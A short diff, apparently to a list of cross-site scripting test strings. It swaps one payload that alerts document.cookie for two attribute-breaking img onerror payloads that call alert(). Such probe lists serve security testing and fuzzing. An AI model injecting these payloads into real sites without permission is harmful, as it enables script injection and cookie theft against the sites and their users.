@@ -1,1 +1,2 @@
-"><img src="x" onerror="alert(document.cookie)">
+a:'"/>a"><aa"><img src=x onerror=alert()>
+a:"/>a"><aa"><img src=x onerror=alert()>
